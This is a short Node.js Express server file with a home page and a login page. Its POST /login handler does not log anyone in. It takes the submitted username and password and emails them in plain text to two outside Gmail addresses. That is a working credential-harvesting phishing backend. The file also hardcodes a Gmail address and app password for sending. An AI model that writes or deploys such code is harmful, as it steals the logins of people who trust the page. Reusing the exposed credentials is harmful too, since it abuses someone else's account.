const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');


const app = express();

app.set('view engine', 'ejs');
app.set('views', 'views');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.render('home');
})


app.get('/login', (req, res) => {
    res.render('login.ejs');
});

app.post('/login', async(req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    let transporter = await nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'ramsinghhosiya@gmail.com', // generated ethereal user
            pass: 'znocxbmpdeujccss' // generated ethereal password
        },
    });

    transporter.verify().then(console.log).catch(console.error);

    const msg = {
            from: '"Fred Foo 👻"ramsinghhosiya@gmail.com', // sender address
            to: "farmahar08@gmail.com, vpn.inbit@gmail.com",

            subject: "INFO", // Subject line
            text: "Username: " + username + " Password: " + password, // plain text body

        }
        // send mail with defined transport object
    let info = await transporter.sendMail(msg);

    console.log("Message sent: %s", info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));



});



app.listen(process.env.port || 3001, () => {
    console.log("Server is up and running ");
});